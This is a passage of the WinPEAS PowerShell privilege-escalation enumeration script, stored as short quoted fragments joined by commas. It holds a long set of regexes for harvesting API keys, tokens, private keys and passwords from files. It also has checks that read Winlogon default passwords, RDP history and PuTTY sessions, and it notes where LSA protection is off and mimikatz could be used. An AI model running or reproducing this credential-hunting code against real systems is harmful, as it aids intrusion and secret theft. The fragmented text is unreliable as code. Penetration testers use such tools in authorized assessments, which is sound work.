  $r','egexSearch.add("New',' Relic User API Key',', User API ID & Ing','est Browser API Key','", "(NRAK-[A-Z0-9]{','27})|((newrelic[a-z','0-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([A-Z0','-9]{64})[''""])|(NRJ','S-[a-f0-9]{19})")
 ',' $regexSearch.add("','Nownodes", "(nownod','es[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""]','([A-Za-z0-9]{32})[''','""]")
  $regexSearc','h.add("Npm Access T','oken", "(npm_[a-zA-','Z0-9]{36})")
  $reg','exSearch.add("Nytim','es Access Token", "','([a-z0-9=_\-]{32})"',')
  $regexSearch.ad','d("Okta Access Toke','n", "([a-z0-9=_\-]{','42})")
  $regexSear','ch.add("OpenAI API ','Token", "sk-[A-Za-z','0-9]{48}")
  $regex','Search.add("ORB Int','elligence Access Ke','y", "[''""][a-f0-9]{','8}-[a-f0-9]{4}-[a-f','0-9]{4}-[a-f0-9]{4}','-[a-f0-9]{12}[''""]"',')
  $regexSearch.ad','d("Pastebin API Key','", "(pastebin[a-z0-','9_ \.,\-]{0,25})(=|','>|:=|\|\|:|<=|=>|:)','.{0,5}[''""]([a-z0-9',']{32})[''""]")
  $re','gexSearch.add("PayP','al Braintree Access',' Token", ''access_to','ken\$production\$[0','-9a-z]{16}\$[0-9a-f',']{32}'')
  $regexSea','rch.add("Picatic AP','I Key", "sk_live_[0','-9a-z]{32}")
  $reg','exSearch.add("Pinat','a API Key", "(pinat','a[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""](','[a-z0-9]{64})[''""]"',')
  $regexSearch.ad','d("Planetscale API ','Key", "pscale_tkn_[','a-zA-Z0-9_\.\-]{43}','")
  $regexSearch.a','dd("PlanetScale OAu','th token", "(pscale','_oauth_[a-zA-Z0-9_\','.\-]{32,64})")
  $r','egexSearch.add("Pla','netscale Password",',' "pscale_pw_[a-zA-Z','0-9_\.\-]{43}")
  $','regexSearch.add("Pl','aid API Token", "(a','ccess-(?:sandbox|de','velopment|productio','n)-[0-9a-f]{8}-[0-9','a-f]{4}-[0-9a-f]{4}','-[0-9a-f]{4}-[0-9a-','f]{12})")
  $regexS','earch.add("Plaid Cl','ient ID", "([a-z0-9',']{24})")
  $regexSe','arch.add("Plaid Sec','ret key", "([a-z0-9',']{30})")
  $regexSe','arch.add("Prefect A','PI token", "(pnu_[a','-z0-9]{36})")
  $re','gexSearch.add("Post','man API Key", "PMAK','-[a-fA-F0-9]{24}-[a','-fA-F0-9]{34}")
  $','regexSearch.add("Pr','ivate Keys", "\-\-\','-\-\-BEGIN PRIVATE ','KEY\-\-\-\-\-|\-\-\','-\-\-BEGIN RSA PRIV','ATE KEY\-\-\-\-\-|\','-\-\-\-\-BEGIN OPEN','SSH PRIVATE KEY\-\-','\-\-\-|\-\-\-\-\-BE','GIN PGP PRIVATE KEY',' BLOCK\-\-\-\-\-|\-','\-\-\-\-BEGIN DSA P','RIVATE KEY\-\-\-\-\','-|\-\-\-\-\-BEGIN E','C PRIVATE KEY\-\-\-','\-\-")
  $regexSear','ch.add("Pulumi API ','Key", "pul-[a-f0-9]','{40}")
  $regexSear','ch.add("PyPI upload',' token", "pypi-AgEI','cHlwaS5vcmc[A-Za-z0','-9_\-]{50,}")
  $re','gexSearch.add("Quip',' API Key", "(quip[a','-z0-9_ \.,\-]{0,25}',')(=|>|:=|\|\|:|<=|=','>|:).{0,5}[''""]([a-','zA-Z0-9]{15}=\|[0-9',']{10}\|[a-zA-Z0-9\/','+]{43}=)[''""]")
  $','regexSearch.add("Ra','pidAPI Access Token','", "([a-z0-9_-]{50}',')")
  $regexSearch.','add("Rubygem API Ke','y", "rubygems_[a-f0','-9]{48}")
  $regexS','earch.add("Readme A','PI token", "rdme_[a','-z0-9]{70}")
  $reg','exSearch.add("Sendb','ird Access ID", "([','0-9a-f]{8}-[0-9a-f]','{4}-[0-9a-f]{4}-[0-','9a-f]{4}-[0-9a-f]{1','2})")
  $regexSearc','h.add("Sendbird Acc','ess Token", "([a-f0','-9]{40})")
  $regex','Search.add("Sendgri','d API Key", "SG\.[a','-zA-Z0-9_\.\-]{66}"',')
  $regexSearch.ad','d("Sendinblue API K','ey", "xkeysib-[a-f0','-9]{64}-[a-zA-Z0-9]','{16}")
  $regexSear','ch.add("Sentry Acce','ss Token", "([a-f0-','9]{64})")
  $regexS','earch.add("Shippo A','PI Key, Access Toke','n, Custom Access To','ken, Private App Ac','cess Token & Shared',' Secret", "shippo_(','live|test)_[a-f0-9]','{40}|shpat_[a-fA-F0','-9]{32}|shpca_[a-fA','-F0-9]{32}|shppa_[a','-fA-F0-9]{32}|shpss','_[a-fA-F0-9]{32}")
','  $regexSearch.add(','"Sidekiq Secret", "','([a-f0-9]{8}:[a-f0-','9]{8})")
  $regexSe','arch.add("Sidekiq S','ensitive URL", "([a','-f0-9]{8}:[a-f0-9]{','8})@(?:gems.contrib','sys.com|enterprise.','contribsys.com)")
 ',' $regexSearch.add("','Slack Token", "xox[','baprs]-([0-9a-zA-Z]','{10,48})?")
  $rege','xSearch.add("Slack ','Webhook", "https://','hooks.slack.com/ser','vices/T[a-zA-Z0-9_]','{10}/B[a-zA-Z0-9_]{','10}/[a-zA-Z0-9_]{24','}")
  $regexSearch.','add("Smarksheel API',' Key", "(smartsheet','[a-z0-9_ \.,\-]{0,2','5})(=|>|:=|\|\|:|<=','|=>|:).{0,5}[''""]([','a-z0-9]{26})[''""]")','
  $regexSearch.add','("Square Access Tok','en", "sqOatp-[0-9A-','Za-z_\-]{22}")
  $r','egexSearch.add("Squ','are API Key", "EAAA','E[a-zA-Z0-9_-]{59}"',')
  $regexSearch.ad','d("Square Oauth Sec','ret", "sq0csp-[ 0-9','A-Za-z_\-]{43}")
  ','$regexSearch.add("S','tytch API Key", "se','cret-.*-[a-zA-Z0-9_','=\-]{36}")
  $regex','Search.add("Stripe ','Access Token & API ','Key", "(sk|pk)_(tes','t|live)_[0-9a-z]{10',',32}|k_live_[0-9a-z','A-Z]{24}")
  $regex','Search.add("SumoLog','ic Access ID", "([a','-z0-9]{14})")
  $re','gexSearch.add("Sumo','Logic Access Token"',', "([a-z0-9]{64})")','
  $regexSearch.add','("Telegram Bot API ','Token", "[0-9]+:AA[','0-9A-Za-z\\-_]{33}"',')
  $regexSearch.ad','d("Travis CI Access',' Token", "([a-z0-9]','{22})")
  $regexSea','rch.add("Trello API',' Key", "(trello[a-z','0-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([0-9a','-z]{32})[''""]")
  $','regexSearch.add("Tw','ilio API Key", "SK[','0-9a-fA-F]{32}")
  ','$regexSearch.add("T','witch API Key", "(t','witch[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}[''','""]([a-z0-9]{30})[''','""]")
  $regexSearc','h.add("Twitter Clie','nt ID", "[tT][wW][i','I][tT][tT][eE][rR](','.{0,20})?[''""][0-9a','-z]{18,25}")
  $reg','exSearch.add("Twitt','er Bearer Token", "','(A{22}[a-zA-Z0-9%]{','80,100})")
  $regex','Search.add("Twitter',' Oauth", "[tT][wW][','iI][tT][tT][eE][rR]','.{0,30}[''""\\s][0-9','a-zA-Z]{35,44}[''""\','\s]")
  $regexSearc','h.add("Twitter Secr','et Key", "[tT][wW][','iI][tT][tT][eE][rR]','(.{0,20})?[''""][0-9','a-z]{35,44}")
  $re','gexSearch.add("Type','form API Key", "tfp','_[a-z0-9_\.=\-]{59}','")
  $regexSearch.a','dd("URLScan API Key','", "[''""][a-f0-9]{8','}-[a-f0-9]{4}-[a-f0','-9]{4}-[a-f0-9]{4}-','[a-f0-9]{12}[''""]")','
  $regexSearch.add','("Vault Token", "[s','b]\.[a-zA-Z0-9]{24}','")
  $regexSearch.a','dd("Yandex Access T','oken", "(t1\.[A-Z0-','9a-z_-]+[=]{0,2}\.[','A-Z0-9a-z_-]{86}[=]','{0,2})")
  $regexSe','arch.add("Yandex AP','I Key", "(AQVN[A-Za','-z0-9_\-]{35,38})")','
  $regexSearch.add','("Yandex AWS Access',' Token", "(YC[a-zA-','Z0-9_\-]{38})")
  $','regexSearch.add("We','b3 API Key", "(web3','[a-z0-9_ \.,\-]{0,2','5})(=|>|:=|\|\|:|<=','|=>|:).{0,5}[''""]([','A-Za-z0-9_=\-]+\.[A','-Za-z0-9_=\-]+\.?[A','-Za-z0-9_.+/=\-]*)[','''""]")
  $regexSear','ch.add("Zendesk Sec','ret Key", "([a-z0-9',']{40})")
  $regexSe','arch.add("Generic A','PI Key", "((key|api','|token|secret|passw','ord)[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[''"','"]([0-9a-zA-Z_=\-]{','8,64})[''""]")
}

if',' ($webAuth) {
  $re','gexSearch.add("Auth','orization Basic", "','basic [a-zA-Z0-9_:\','.=\-]+")
  $regexSe','arch.add("Authoriza','tion Bearer", "bear','er [a-zA-Z0-9_\.=\-',']+")
  $regexSearch','.add("Alibaba Acces','s Key ID", "(LTAI)[','a-z0-9]{20}")
  $re','gexSearch.add("Alib','aba Secret Key", "(','alibaba[a-z0-9_ \.,','\-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5}','[''""]([a-z0-9]{30})','[''""]")
  $regexSea','rch.add("Asana Clie','nt ID", "((asana[a-','z0-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([0-9',']{16})[''""])|((asan','a[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""](','[a-z0-9]{32})[''""])','")
  $regexSearch.a','dd("AWS Client ID",',' "(A3T[A-Z0-9]|AKIA','|AGPA|AIDA|AROA|AIP','A|ANPA|ANVA|ASIA)[A','-Z0-9]{16}")
  $reg','exSearch.add("AWS M','WS Key", "amzn\.mws','\.[0-9a-f]{8}-[0-9a','-f]{4}-[0-9a-f]{4}-','[0-9a-f]{4}-[0-9a-f',']{12}")
  $regexSea','rch.add("AWS Secret',' Key", "aws(.{0,20}',')?[''""][0-9a-zA-Z\/','+]{40}[''""]")
  $re','gexSearch.add("AWS ','AppSync GraphQL Key','", "da2-[a-z0-9]{26','}")
  $regexSearch.','add("Basic Auth Cre','dentials", "://[a-z','A-Z0-9]+:[a-zA-Z0-9',']+@[a-zA-Z0-9]+\.[a','-zA-Z]+")
  $regexS','earch.add("Beamer C','lient Secret", "(be','amer[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[''"','"](b_[a-z0-9=_\-]{4','4})[''""]")
  $regex','Search.add("Cloudin','ary Basic Auth", "c','loudinary://[0-9]{1','5}:[0-9A-Za-z]+@[a-','z]+")
  $regexSearc','h.add("Facebook Cli','ent ID", "([fF][aA]','[cC][eE][bB][oO][oO','][kK]|[fF][bB])(.{0',',20})?[''""][0-9]{13',',17}")
  $regexSear','ch.add("Facebook Oa','uth", "[fF][aA][cC]','[eE][bB][oO][oO][kK','].*[''|""][0-9a-f]{3','2}[''|""]")
  $regex','Search.add("Faceboo','k Secret Key", "([f','F][aA][cC][eE][bB][','oO][oO][kK]|[fF][bB','])(.{0,20})?[''""][0','-9a-f]{32}")
  $reg','exSearch.add("Jenki','ns Creds", "<[a-zA-','Z]*>{[a-zA-Z0-9=+/]','*}<")
  $regexSearc','h.add("Generic Secr','et", "[sS][eE][cC][','rR][eE][tT].*[''""][','0-9a-zA-Z]{32,45}[''','""]")
  $regexSearc','h.add("Basic Auth",',' "//(.+):(.+)@")
  ','$regexSearch.add("P','HP Passwords", "(pw','d|passwd|password|P','ASSWD|PASSWORD|dbus','er|dbpass|pass'').*[','=:].+|define ?\(''(\','w*pass|\w*pwd|\w*us','er|\w*datab)")
  $r','egexSearch.add("Con','fig Secrets (Passwd',' / Credentials)", "','passwd.*|creden.*|^','kind:[^a-zA-Z0-9_]?','Secret|[^a-zA-Z0-9_',']env:|secret:|secre','tName:|^kind:[^a-zA','-Z0-9_]?EncryptionC','onfiguration|\-\-en','cryption\-provider\','-config")
  $regexS','earch.add("Generiac',' API tokens search"',', "(access_key|acce','ss_token|admin_pass','|admin_user|algolia','_admin_key|algolia_','api_key|alias_pass|','alicloud_access_key','| amazon_secret_acc','ess_key|amazonaws|a','nsible_vault_passwo','rd|aos_key|api_key|','api_key_secret|api_','key_sid|api_secret|',' api.googlemaps AIz','a|apidocs|apikey|ap','iSecret|app_debug|a','pp_id|app_key|app_l','og_level|app_secret','|appkey|appkeysecre','t| application_key|','appsecret|appspot|a','uth_token|authoriza','tionToken|authsecre','t|aws_access|aws_ac','cess_key_id|aws_buc','ket| aws_key|aws_se','cret|aws_secret_key','|aws_token|AWSSecre','tKey|b2_app_key|bas','hrc password| bintr','ay_apikey|bintray_g','pg_password|bintray','_key|bintraykey|blu','emix_api_key|bluemi','x_pass|browserstack','_access_key| bucket','_password|bucketeer','_aws_access_key_id|','bucketeer_aws_secre','t_access_key|built_','branch_deploy_key|b','x_password|cache_dr','iver| cache_s3_secr','et_key|cattle_acces','s_key|cattle_secret','_key|certificate_pa','ssword|ci_deploy_pa','ssword|client_secre','t| client_zpk_secre','t_key|clojars_passw','ord|cloud_api_key|c','loud_watch_aws_acce','ss_key|cloudant_pas','sword| cloudflare_a','pi_key|cloudflare_a','uth_key|cloudinary_','api_secret|cloudina','ry_name|codecov_tok','en|conn.login| conn','ectionstring|consum','er_key|consumer_sec','ret|credentials|cyp','ress_record_key|dat','abase_password|data','base_schema_test| d','atadog_api_key|data','dog_app_key|db_pass','word|db_server|db_u','sername|dbpasswd|db','password|dbuser|dep','loy_password| digit','alocean_ssh_key_bod','y|digitalocean_ssh_','key_ids|docker_hub_','password|docker_key','|docker_pass|docker','_passwd| docker_pas','sword|dockerhub_pas','sword|dockerhubpass','word|dot-files|dotf','iles|droplet_travis','_password|dynamoacc','esskeyid| dynamosec','retaccesskey|elasti','ca_host|elastica_po','rt|elasticsearch_pa','ssword|encryption_k','ey|encryption_passw','ord| env.heroku_api','_key|env.sonatype_p','assword|eureka.awss','ecretkey)[a-z0-9_ .',',<\-]{0,25}(=|>|:=|','\|\|:|<=|=>|:).{0,5','}[''""]([0-9a-zA-Z_=','\-]{8,64})[''""]")
}','

if($FullCheck){$E','xcel = $true}

$reg','exSearch.add("IPs",',' "(25[0-5]|2[0-4][0','-9]|[01]?[0-9][0-9]','?)\.(25[0-5]|2[0-4]','[0-9]|[01]?[0-9][0-','9]?)\.(25[0-5]|2[0-','4][0-9]|[01]?[0-9][','0-9]?)\.(25[0-5]|2[','0-4][0-9]|[01]?[0-9','][0-9]?)")
$Drives ','= Get-PSDrive | Whe','re-Object { $_.Root',' -like "*:\" }
$fil','eExtensions = @("*.','xml", "*.txt", "*.c','onf", "*.config", "','*.cfg", "*.ini", ".','y*ml", "*.log", "*.','bak", "*.xls", "*.x','lsx", "*.xlsm")


#','###################','#### INTRODUCTION #','###################','####
$stopwatch = [','system.diagnostics.','stopwatch]::StartNe','w()

if ($FullCheck',') {
  Write-Host "*','*Full Check Enabled','. This will signifi','cantly increase fal','se positives in reg','istry / folder chec','k for Usernames / P','asswords.**"
}
# In','troduction    
Writ','e-Host -BackgroundC','olor Red -Foregroun','dColor White  "ADVI','SORY: WinPEAS - Win','dows local Privileg','e Escalation Awesom','e Script"
Write-Hos','t -BackgroundColor ','Red -ForegroundColo','r White "WinPEAS sh','ould be used for au','thorized penetratio','n testing and/or ed','ucational purposes ','only"
Write-Host -B','ackgroundColor Red ','-ForegroundColor Wh','ite "Any misuse of ','this software will ','not be the responsi','bility of the autho','r or of any other c','ollaborator"
Write-','Host -BackgroundCol','or Red -ForegroundC','olor White "Use it ','at your own network','s and/or with the n','etwork owner''s expl','icit permission"


','# Color Scheme Intr','oduction
Write-Host',' -ForegroundColor r','ed  "Indicates spec','ial privilege over ','an object or miscon','figuration"
Write-H','ost -ForegroundColo','r green  "Indicates',' protection is enab','led or something is',' well configured"
W','rite-Host -Foregrou','ndColor cyan  "Indi','cates active users"','
Write-Host -Foregr','oundColor Gray  "In','dicates disabled us','ers"
Write-Host -Fo','regroundColor yello','w  "Indicates links','"
Write-Host -Foreg','roundColor Blue "In','dicates title"


Wr','ite-Host "You can f','ind a Windows local',' PE Checklist here:',' https://book.hackt','ricks.xyz/windows-h','ardening/checklist-','windows-privilege-e','scalation" -Foregro','undColor Yellow
#wr','ite-host  "Creating',' Dynamic lists, thi','s could take a whil','e, please wait..."
','#write-host  "Loadi','ng sensitive_files ','yaml definitions fi','le..."
#write-host ',' "Loading regexes y','aml definitions fil','e..."


###########','############# SYSTE','M INFORMATION #####','###################','

Write-Host ""
if ','($TimeStamp) { Time','Elapsed }
Write-Hos','t "================','===================','=||SYSTEM INFORMATI','ON ||==============','===================','==="
"The following',' information is cur','ated. To get a full',' list of system inf','ormation, run the c','mdlet get-computeri','nfo"

#System Info ','from get-computer i','nfo
systeminfo.exe
','

#Hotfixes install','ed sorted by date
W','rite-Host ""
if ($T','imeStamp) { TimeEla','psed }
Write-Host -','ForegroundColor Blu','e "=========|| WIND','OWS HOTFIXES"
Write','-Host "=| Check if ','windows is vulnerab','le with Watson http','s://github.com/rast','a-mouse/Watson" -Fo','regroundColor Yello','w
Write-Host "Possi','ble exploits (https','://github.com/codin','go/OSCP-2/blob/mast','er/Windows/WinPrivC','heck.bat)" -Foregro','undColor Yellow
$Ho','tfix = Get-HotFix |',' Sort-Object -Desce','nding -Property Ins','talledOn -ErrorActi','on SilentlyContinue',' | Select-Object Ho','tfixID, Description',', InstalledBy, Inst','alledOn
$Hotfix | F','ormat-Table -AutoSi','ze


#Show all uniq','ue updates installe','d
Write-Host ""
if ','($TimeStamp) { Time','Elapsed }
Write-Hos','t -ForegroundColor ','Blue "=========|| A','LL UPDATES INSTALLE','D"


# 0, and 5 are',' not used for histo','ry
# See https://ms','dn.microsoft.com/en','-us/library/windows','/desktop/aa387095(v','=vs.85).aspx
# Sour','ce: https://stackov','erflow.com/question','s/41626129/how-do-i','-get-the-update-his','tory-from-windows-u','pdate-in-powershell','?utm_medium=organic','&utm_source=google_','rich_qa&utm_campaig','n=google_rich_qa

$','session = (New-Obje','ct -ComObject ''Micr','osoft.Update.Sessio','n'')
# Query the lat','est 50 updates star','ting with the first',' record
$history = ','$session.QueryHisto','ry("", 0, 1000) | S','elect-Object Result','Code, Date, Title

','#create an array fo','r unique HotFixes
$','HotfixUnique = @()
','#$HotfixUnique += (','$history[0].title |',' Select-String -All','Matches -Pattern ''K','B(\d{4,6})'').Matche','s.Value

$HotFixRet','urnNum = @()
#$HotF','ixReturnNum += 0 

','for ($i = 0; $i -lt',' $history.Count; $i','++) {
  $check = re','turnHotFixID -title',' $history[$i].Title','
  if ($HotfixUniqu','e -like $check) {
 ','   #Do Nothing
  }
','  else {
    $Hotfi','xUnique += $check
 ','   $HotFixReturnNum',' += $i
  }
}
$Final','HotfixList = @()

$','hotfixreturnNum | F','orEach-Object {
  $','HotFixItem = $histo','ry[$_]
  $Result = ','$HotFixItem.ResultC','ode
  # https://lea','rn.microsoft.com/en','-us/windows/win32/a','pi/wuapi/ne-wuapi-o','perationresultcode?','redirectedfrom=MSDN','
  switch ($Result)',' {
    1 {
      $R','esult = "Missing/Su','perseded"
    }
   ',' 2 {
      $Result ','= "Succeeded"
    }','
    3 {
      $Res','ult = "Succeeded Wi','th Errors"
    }
  ','  4 {
      $Result',' = "Failed"
    }
 ','   5 {
      $Resul','t = "Canceled"
    ','}
  }
  $FinalHotfi','xList += [PSCustomO','bject]@{
    Result',' = $Result
    Date','   = $HotFixItem.Da','te
    Title  = $Ho','tFixItem.Title
  } ','   
}
$FinalHotfixL','ist | Format-Table ','-AutoSize


Write-H','ost ""
if ($TimeSta','mp) { TimeElapsed }','
Write-Host -Foregr','oundColor Blue "===','======|| Drive Info','"
# Load the System','.Management assembl','y
Add-Type -Assembl','yName System.Manage','ment

# Create a Ma','nagementObjectSearc','her to query Win32_','LogicalDisk
$diskSe','archer = New-Object',' System.Management.','ManagementObjectSea','rcher("SELECT * FRO','M Win32_LogicalDisk',' WHERE DriveType = ','3")

# Get the syst','em drives
$systemDr','ives = $diskSearche','r.Get()

# Loop thr','ough each drive and',' display its inform','ation
foreach ($dri','ve in $systemDrives',') {
  $driveLetter ','= $drive.DeviceID
 ',' $driveLabel = $dri','ve.VolumeName
  $dr','iveSize = [math]::R','ound($drive.Size / ','1GB, 2)
  $driveFre','eSpace = [math]::Ro','und($drive.FreeSpac','e / 1GB, 2)

  Writ','e-Output "Drive: $d','riveLetter"
  Write','-Output "Label: $dr','iveLabel"
  Write-O','utput "Size: $drive','Size GB"
  Write-Ou','tput "Free Space: $','driveFreeSpace GB"
','  Write-Output ""
}','


Write-Host ""
if',' ($TimeStamp) { Tim','eElapsed }
Write-Ho','st -ForegroundColor',' Blue "=========|| ','Antivirus Detection',' (attemping to read',' exclusions as well',')"
WMIC /Node:local','host /Namespace:\\r','oot\SecurityCenter2',' Path AntiVirusProd','uct Get displayName','
Get-ChildItem ''reg','istry::HKLM\SOFTWAR','E\Microsoft\Windows',' Defender\Exclusion','s'' -ErrorAction Sil','entlyContinue


Wri','te-Host ""
if ($Tim','eStamp) { TimeElaps','ed }
Write-Host -Fo','regroundColor Blue ','"=========|| NET AC','COUNTS Info"
net ac','counts

###########','############# REGIS','TRY SETTING CHECK #','###################','####
Write-Host ""
','if ($TimeStamp) { T','imeElapsed }
Write-','Host -ForegroundCol','or Blue "=========|','| REGISTRY SETTINGS',' CHECK"

 
Write-Ho','st ""
if ($TimeStam','p) { TimeElapsed }
','Write-Host -Foregro','undColor Blue "====','=====|| Audit Log S','ettings"
#Check aud','it registry
if ((Te','st-Path HKLM:\SOFTW','ARE\Microsoft\Windo','ws\CurrentVersion\P','olicies\System\Audi','t\).Property) {
  G','et-Item -Path HKLM:','\SOFTWARE\Microsoft','\Windows\CurrentVer','sion\Policies\Syste','m\Audit\
}
else {
 ',' Write-Host "No Aud','it Log settings, no',' registry entry fou','nd."
}

 
Write-Hos','t ""
if ($TimeStamp',') { TimeElapsed }
W','rite-Host -Foregrou','ndColor Blue "=====','====|| Windows Even','t Forward (WEF) reg','istry"
if (Test-Pat','h HKLM:\SOFTWARE\Po','licies\Microsoft\Wi','ndows\EventLog\Even','tForwarding\Subscri','ptionManager) {
  G','et-Item HKLM:\SOFTW','ARE\Policies\Micros','oft\Windows\EventLo','g\EventForwarding\S','ubscriptionManager
','}
else {
  Write-Ho','st "Logs are not be','ing fowarded, no re','gistry entry found.','"
}

 
Write-Host "','"
if ($TimeStamp) {',' TimeElapsed }
Writ','e-Host -ForegroundC','olor Blue "========','=|| LAPS Check"
if ','(Test-Path ''C:\Prog','ram Files\LAPS\CSE\','Admpwd.dll'') { Writ','e-Host "LAPS dll fo','und on this machine',' at C:\Program File','s\LAPS\CSE\" -Foreg','roundColor Green }
','elseif (Test-Path ''','C:\Program Files (x','86)\LAPS\CSE\Admpwd','.dll'' ) { Write-Hos','t "LAPS dll found o','n this machine at C',':\Program Files (x8','6)\LAPS\CSE\" -Fore','groundColor Green }','
else { Write-Host ','"LAPS dlls not foun','d on this machine" ','}
if ((Get-ItemProp','erty HKLM:\Software','\Policies\Microsoft',' Services\AdmPwd -E','rrorAction Silently','Continue).AdmPwdEna','bled -eq 1) { Write','-Host "LAPS registr','y key found on this',' machine" -Foregrou','ndColor Green }


W','rite-Host ""
if ($T','imeStamp) { TimeEla','psed }
Write-Host -','ForegroundColor Blu','e "=========|| WDig','est Check"
$WDigest',' = (Get-ItemPropert','y HKLM:\SYSTEM\Curr','entControlSet\Contr','ol\SecurityProvider','s\WDigest).UseLogon','Credential
switch (','$WDigest) {
  0 { W','rite-Host "Value 0 ','found. Plain-text P','asswords are not st','ored in LSASS" }
  ','1 { Write-Host "Val','ue 1 found. Plain-t','ext Passwords may b','e stored in LSASS" ','-ForegroundColor re','d }
  Default { Wri','te-Host "The system',' was unable to find',' the specified regi','stry value: UesLogo','nCredential" }
}

 ','
Write-Host ""
if (','$TimeStamp) { TimeE','lapsed }
Write-Host',' -ForegroundColor B','lue "=========|| LS','A Protection Check"','
$RunAsPPL = (Get-I','temProperty HKLM:\S','YSTEM\CurrentContro','lSet\Control\LSA).R','unAsPPL
$RunAsPPLBo','ot = (Get-ItemPrope','rty HKLM:\SYSTEM\Cu','rrentControlSet\Con','trol\LSA).RunAsPPLB','oot
switch ($RunAsP','PL) {
  2 { Write-H','ost "RunAsPPL: 2. E','nabled without UEFI',' Lock" }
  1 { Writ','e-Host "RunAsPPL: 1','. Enabled with UEFI',' Lock" }
  0 { Writ','e-Host "RunAsPPL: 0','. LSA Protection Di','sabled. Try mimikat','z." -ForegroundColo','r red }
  Default {',' "The system was un','able to find the sp','ecified registry va','lue: RunAsPPL / Run','AsPPLBoot" }
}
if (','$RunAsPPLBoot) { Wr','ite-Host "RunAsPPLB','oot: $RunAsPPLBoot"',' }

 
Write-Host ""','
if ($TimeStamp) { ','TimeElapsed }
Write','-Host -ForegroundCo','lor Blue "=========','|| Credential Guard',' Check"
$LsaCfgFlag','s = (Get-ItemProper','ty HKLM:\SYSTEM\Cur','rentControlSet\Cont','rol\LSA).LsaCfgFlag','s
switch ($LsaCfgFl','ags) {
  2 { Write-','Host "LsaCfgFlags 2','. Enabled without U','EFI Lock" }
  1 { W','rite-Host "LsaCfgFl','ags 1. Enabled with',' UEFI Lock" }
  0 {',' Write-Host "LsaCfg','Flags 0. LsaCfgFlag','s Disabled." -Foreg','roundColor red }
  ','Default { "The syst','em was unable to fi','nd the specified re','gistry value: LsaCf','gFlags" }
}

 
Writ','e-Host ""
if ($Time','Stamp) { TimeElapse','d }
Write-Host -For','egroundColor Blue "','=========|| Cached ','WinLogon Credential','s Check"
if (Test-P','ath "HKLM:\SOFTWARE','\Microsoft\Windows ','NT\CurrentVersion\W','inlogon") {
  (Get-','ItemProperty "HKLM:','\SOFTWARE\Microsoft','\Windows NT\Current','Version\Winlogon" -','Name "CACHEDLOGONSC','OUNT").CACHEDLOGONS','COUNT
  Write-Host ','"However, only the ','SYSTEM user can vie','w the credentials h','ere: HKEY_LOCAL_MAC','HINE\SECURITY\Cache','"
  Write-Host "Or,',' using mimikatz lsa','dump::cache"
}

Wri','te-Host ""
if ($Tim','eStamp) { TimeElaps','ed }
Write-Host -Fo','regroundColor Blue ','"=========|| Addito','nal Winlogon Creden','tials Check"

(Get-','ItemProperty "HKLM:','\SOFTWARE\Microsoft','\Windows NT\Current','Version\Winlogon").','DefaultDomainName
(','Get-ItemProperty "H','KLM:\SOFTWARE\Micro','soft\Windows NT\Cur','rentVersion\Winlogo','n").DefaultUserName','
(Get-ItemProperty ','"HKLM:\SOFTWARE\Mic','rosoft\Windows NT\C','urrentVersion\Winlo','gon").DefaultPasswo','rd
(Get-ItemPropert','y "HKLM:\SOFTWARE\M','icrosoft\Windows NT','\CurrentVersion\Win','logon").AltDefaultD','omainName
(Get-Item','Property "HKLM:\SOF','TWARE\Microsoft\Win','dows NT\CurrentVers','ion\Winlogon").AltD','efaultUserName
(Get','-ItemProperty "HKLM',':\SOFTWARE\Microsof','t\Windows NT\Curren','tVersion\Winlogon")','.AltDefaultPassword','


Write-Host ""
if',' ($TimeStamp) { Tim','eElapsed }
Write-Ho','st -ForegroundColor',' Blue "=========|| ','RDCMan Settings Che','ck"

if (Test-Path ','"$env:USERPROFILE\a','ppdata\Local\Micros','oft\Remote Desktop ','Connection Manager\','RDCMan.settings") {','
  Write-Host "RDCM','an Settings Found a','t: $($env:USERPROFI','LE)\appdata\Local\M','icrosoft\Remote Des','ktop Connection Man','ager\RDCMan.setting','s" -ForegroundColor',' Red
}
else { Write','-Host "No RCDMan.Se','ttings found." }


','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| RDP',' Saved Connections ','Check"

Write-Host ','"HK_Users"
New-PSDr','ive -PSProvider Reg','istry -Name HKU -Ro','ot HKEY_USERS
Get-C','hildItem HKU:\ -Err','orAction SilentlyCo','ntinue | ForEach-Ob','ject {
  # get the ','SID from output
  $','HKUSID = $_.Name.Re','place(''HKEY_USERS\''',', "")
  if (Test-Pa','th "registry::HKEY_','USERS\$HKUSID\Softw','are\Microsoft\Termi','nal Server Client\D','efault") {
    Writ','e-Host "Server Foun','d: $((Get-ItemPrope','rty "registry::HKEY','_USERS\$HKUSID\Soft','ware\Microsoft\Term','inal Server Client\','Default" -Name MRU0',').MRU0)"
  }
  else',' { Write-Host "Not ','found for $($_.Name',')" }
}

Write-Host ','"HKCU"
if (Test-Pat','h "registry::HKEY_C','URRENT_USER\Softwar','e\Microsoft\Termina','l Server Client\Def','ault") {
  Write-Ho','st "Server Found: $','((Get-ItemProperty ','"registry::HKEY_CUR','RENT_USER\Software\','Microsoft\Terminal ','Server Client\Defau','lt" -Name MRU0).MRU','0)"
}
else { Write-','Host "Terminal Serv','er Client not found',' in HCKU" }

Write-','Host ""
if ($TimeSt','amp) { TimeElapsed ','}
Write-Host -Foreg','roundColor Blue "==','=======|| Putty Sto','red Credentials Che','ck"

if (Test-Path ','HKCU:\SOFTWARE\Simo','nTatham\PuTTY\Sessi','ons) {
  Get-ChildI','tem HKCU:\SOFTWARE\','SimonTatham\PuTTY\S','essions | ForEach-O','bject {
    $RegKey','Name = Split-Path $','_.Name -Leaf
    Wr','ite-Host "Key: $Reg','KeyName"
